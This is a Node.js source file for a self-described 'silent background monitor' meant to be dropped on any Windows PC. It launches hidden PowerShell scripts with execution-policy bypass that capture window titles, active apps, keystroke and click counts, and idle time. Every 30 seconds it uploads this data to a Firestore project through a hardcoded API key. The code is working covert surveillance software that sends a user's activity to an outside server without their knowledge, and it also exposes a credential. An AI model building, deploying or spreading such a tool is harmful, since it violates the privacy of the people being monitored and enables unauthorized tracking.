/**
 * PC Tracker Agent — Silent Background Monitor
 * Drop this .exe on any PC. It tracks activity and sends data to Firebase.
 * No install, no UI, no dependencies needed.
 */
const os = require('os');
const fs = require('fs');
const path = require('path');
const https = require('https');
const { exec } = require('child_process');

// ── Firebase Config ──────────────────────────────────────────────────────
const PROJECT_ID = 'pc-tracker-8b48c';
const API_KEY = 'AIzaSyDT_5Vf1Ti4v5SXfcuvdWmh6iCaGQc52ec';
const FIRESTORE_URL = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents`;

// ── Device Identity ──────────────────────────────────────────────────────
const HOSTNAME = os.hostname();
const DEVICE_ID = HOSTNAME.replace(/[^a-zA-Z0-9_-]/g, '_');

// ── State ────────────────────────────────────────────────────────────────
let currentApp = 'Desktop', currentTitle = '';
let keystrokes = 0, mouseClicks = 0, idleSeconds = 0;
let sessionStart = Date.now();
let loginTime = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
let appUsageMap = {};
let prevIdle = 0, prevTotal = 0;

// ── Temp directory for scripts ───────────────────────────────────────────
const TEMP_DIR = path.join(os.tmpdir(), 'pctracker_agent');
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// ── App Name Prettifier ──────────────────────────────────────────────────
const APP_MAP = {
  'chrome':'Google Chrome','msedge':'Microsoft Edge','firefox':'Mozilla Firefox',
  'code':'Visual Studio Code','devenv':'Visual Studio','explorer':'File Explorer',
  'notepad':'Notepad','cmd':'Command Prompt','powershell':'PowerShell',
  'windowsterminal':'Windows Terminal','slack':'Slack','teams':'Microsoft Teams',
  'discord':'Discord','spotify':'Spotify','winword':'Microsoft Word',
  'excel':'Microsoft Excel','powerpnt':'PowerPoint','outlook':'Outlook',
};
function prettify(raw) {
  return APP_MAP[raw.toLowerCase().trim()] || raw.charAt(0).toUpperCase() + raw.slice(1);
}

// ── CPU Usage ────────────────────────────────────────────────────────────
function getCpu() {
  const cpus = os.cpus(); let idle = 0, total = 0;
  for (const c of cpus) { for (const t of Object.values(c.times)) total += t; idle += c.times.idle; }
  const di = idle - prevIdle, dt = total - prevTotal;
  prevIdle = idle; prevTotal = total;
  return dt === 0 ? 0 : Math.round(((dt - di) / dt) * 100);
}
function getRamGB() { return parseFloat(((os.totalmem() - os.freemem()) / 1e9).toFixed(1)); }
function getRamPct() { return Math.round(((os.totalmem() - os.freemem()) / os.totalmem()) * 100); }
function getTotalRamGB() { return parseFloat((os.totalmem() / 1e9).toFixed(1)); }

// ── Write PowerShell Scripts ─────────────────────────────────────────────
function writeScripts() {
  // Active window tracker
  fs.writeFileSync(path.join(TEMP_DIR, 'activewin.ps1'), `
Add-Type @"
using System;using System.Runtime.InteropServices;using System.Text;
public class WinTracker {
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
}
"@
while ($true) {
    $hwnd = [WinTracker]::GetForegroundWindow()
    $sb = New-Object System.Text.StringBuilder(256)
    [WinTracker]::GetWindowText($hwnd, $sb, 256) | Out-Null
    $pid2 = 0
    [WinTracker]::GetWindowThreadProcessId($hwnd, [ref]$pid2) | Out-Null
    $proc = Get-Process -Id $pid2 -ErrorAction SilentlyContinue
    $name = if ($proc) { $proc.ProcessName } else { "Unknown" }
    Write-Output "$name|||$($sb.ToString())"
    Start-Sleep -Seconds 1
}
`);

  // Input counter
  fs.writeFileSync(path.join(TEMP_DIR, 'input.ps1'), `
$sig = @"
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
"@
$api = Add-Type -MemberDefinition $sig -Name "Win32Input" -Namespace API -PassThru
$keys = 0; $clicks = 0
while ($true) {
    # Mouse buttons: 1=Left, 2=Right, 4=Middle
    for ($i = 1; $i -le 2; $i++) {
        $state = $api::GetAsyncKeyState($i)
        if (($state -band 1) -ne 0) { $clicks++ }
    }
    $state = $api::GetAsyncKeyState(4)
    if (($state -band 1) -ne 0) { $clicks++ }
    # Keyboard keys: 8-254
    for ($i = 8; $i -le 254; $i++) {
        $state = $api::GetAsyncKeyState($i)
        if (($state -band 1) -ne 0) { $keys++ }
    }
    Write-Output "$keys,$clicks"
    Start-Sleep -Milliseconds 200
}
`);

  // Idle detector
  fs.writeFileSync(path.join(TEMP_DIR, 'idle.ps1'), `
Add-Type @"
using System;using System.Runtime.InteropServices;
public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
public class IdleCheck {
    [DllImport("user32.dll")] public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
}
"@
while ($true) {
    $info = New-Object LASTINPUTINFO
    $info.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($info)
    [IdleCheck]::GetLastInputInfo([ref]$info) | Out-Null
    Write-Output ([Math]::Round(([Environment]::TickCount - $info.dwTime) / 1000))
    Start-Sleep -Seconds 5
}
`);
}

// ── Start PowerShell Trackers ────────────────────────────────────────────
let winProc, inputProc, idleProc;

function startTrackers() {
  writeScripts();

  // Active window
  winProc = exec(`powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "${path.join(TEMP_DIR, 'activewin.ps1')}"`, { timeout: 0 });
  if (winProc.stdout) winProc.stdout.on('data', d => {
    const line = d.trim().split('\n').pop().trim();
    const parts = line.split('|||');
    if (parts.length === 2) {
      currentApp = prettify(parts[0] || 'Unknown');
      currentTitle = parts[1] || '';
      appUsageMap[currentApp] = (appUsageMap[currentApp] || 0) + 1;
    }
  });
  winProc.on('error', () => {});

  // Input
  inputProc = exec(`powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "${path.join(TEMP_DIR, 'input.ps1')}"`, { timeout: 0 });
  if (inputProc.stdout) inputProc.stdout.on('data', d => {
    const parts = d.trim().split('\n').pop().split(',');
    if (parts.length === 2) { keystrokes = parseInt(parts[0]) || 0; mouseClicks = parseInt(parts[1]) || 0; }
  });
  inputProc.on('error', () => {});

  // Idle
  idleProc = exec(`powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "${path.join(TEMP_DIR, 'idle.ps1')}"`, { timeout: 0 });
  if (idleProc.stdout) idleProc.stdout.on('data', d => {
    const val = parseInt(d.trim().split('\n').pop());
    if (!isNaN(val)) idleSeconds = val;
  });
  idleProc.on('error', () => {});
}

// ── Firebase REST API Push ───────────────────────────────────────────────
function pushToFirestore() {
  const cpu = getCpu();
  const uptimeMin = Math.round((Date.now() - sessionStart) / 60000);

  // Top 5 apps
  const topApps = Object.entries(appUsageMap)
    .sort((a, b) => b[1] - a[1]).slice(0, 5)
    .map(([name, sec]) => `${name}: ${Math.round(sec / 60)}m`).join(', ');

  const data = {
    fields: {
      hostname:       { stringValue: HOSTNAME },
      platform:       { stringValue: os.platform() },
      arch:           { stringValue: os.arch() },
      cpuModel:       { stringValue: os.cpus()[0]?.model || 'Unknown' },
      cpuCores:       { integerValue: String(os.cpus().length) },
      totalRamGB:     { doubleValue: getTotalRamGB() },
      currentApp:     { stringValue: currentApp },
      currentTitle:   { stringValue: currentTitle.slice(0, 200) },
      cpu:            { integerValue: String(cpu) },
      ramGB:          { doubleValue: getRamGB() },
      ramPercent:     { integerValue: String(getRamPct()) },
      keystrokes:     { integerValue: String(keystrokes) },
      mouseClicks:    { integerValue: String(mouseClicks) },
      idleSeconds:    { integerValue: String(idleSeconds) },
      uptimeMinutes:  { integerValue: String(uptimeMin) },
      loginTime:      { stringValue: loginTime },
      topApps:        { stringValue: topApps },
      isOnline:       { booleanValue: true },
      lastSeen:       { stringValue: new Date().toISOString() },
    }
  };

  const url = `${FIRESTORE_URL}/devices/${DEVICE_ID}?key=${API_KEY}`;
  const body = JSON.stringify(data);

  const req = https.request(url, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  }, res => {
    let out = '';
    res.on('data', c => out += c);
    res.on('end', () => {
      if (res.statusCode === 200) {
        log(`[Firebase] ✓ Synced → ${DEVICE_ID} (CPU ${cpu}%, RAM ${getRamGB()}GB, Keys ${keystrokes})`);
      } else {
        log(`[Firebase] ✗ Error ${res.statusCode}: ${out.slice(0, 200)}`);
      }
    });
  });
  req.on('error', err => log(`[Firebase] ✗ Network error: ${err.message}`));
  req.write(body);
  req.end();
}

function markOffline() {
  const data = { fields: { isOnline: { booleanValue: false }, lastSeen: { stringValue: new Date().toISOString() } } };
  const url = `${FIRESTORE_URL}/devices/${DEVICE_ID}?updateMask.fieldPaths=isOnline&updateMask.fieldPaths=lastSeen&key=${API_KEY}`;
  const body = JSON.stringify(data);
  const req = https.request(url, { method: 'PATCH', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } });
  req.on('error', () => {});
  req.write(body);
  req.end();
}

// ── Logging ──────────────────────────────────────────────────────────────
const LOG_FILE = path.join(TEMP_DIR, 'agent.log');
function log(msg) {
  const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
  console.log(line);
  try { fs.appendFileSync(LOG_FILE, line + '\n'); } catch {}
}

// ── Main ─────────────────────────────────────────────────────────────────
function main() {
  log('');
  log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  log('  🖥️  PC Tracker Agent — Silent Monitor');
  log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  log(`  💻 Device:   ${HOSTNAME} (${DEVICE_ID})`);
  log(`  🧠 CPU:      ${os.cpus()[0]?.model}`);
  log(`  💾 RAM:      ${getTotalRamGB()} GB`);
  log(`  📡 Firebase: ${PROJECT_ID}`);
  log(`  📅 Started:  ${loginTime}`);
  log(`  📁 Logs:     ${LOG_FILE}`);
  log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  log('');

  getCpu(); // warmup

  startTrackers();

  // Sync to Firebase every 30 seconds
  setInterval(pushToFirestore, 30000);
  // First sync after 10 seconds (let trackers warm up)
  setTimeout(pushToFirestore, 10000);

  log('[Agent] Monitoring started. Data syncs to Firebase every 30s.');
  log('[Agent] Close this window or press Ctrl+C to stop.');
}

// ── Graceful Shutdown ────────────────────────────────────────────────────
process.on('SIGINT', () => {
  log('[Agent] Shutting down...');
  markOffline();
  if (winProc) winProc.kill();
  if (inputProc) inputProc.kill();
  if (idleProc) idleProc.kill();
  setTimeout(() => process.exit(0), 2000);
});

process.on('uncaughtException', err => {
  log(`[Error] ${err.message}`);
});

main();
